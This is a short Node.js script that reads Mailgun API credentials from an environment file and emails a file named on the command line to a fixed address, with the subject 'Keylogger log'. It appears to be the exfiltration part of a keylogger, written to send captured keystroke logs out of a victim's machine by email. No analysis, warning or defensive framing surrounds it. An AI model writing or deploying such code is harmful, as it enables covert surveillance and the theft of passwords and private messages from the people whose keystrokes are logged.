env = require('node-env-file');
env('./.env');
Mail = {};
addresses = [process.env.ADDRESS];
Mail.api_key = process.env.MAILGUNKEY;
Mail.domain = process.env.MAILDOMAIN;
Mail.mailgun = require('mailgun-js')({apiKey: Mail.api_key, domain: Mail.domain});
Mail.MailID = process.env.MAILID;
Mail.sendMail = function (subject, text, addresses, attch) {
    var data = {
      from: Mail.MailID,
      to: addresses,
      subject: subject,
      text: text,
      attachment: attch
    };
    Mail.mailgun.messages().send(data, function (error, body) {
        console.error('Mail error', body);
    });
}
Mail.sendMail('Keylogger log', ' ', addresses, [process.argv[2]]);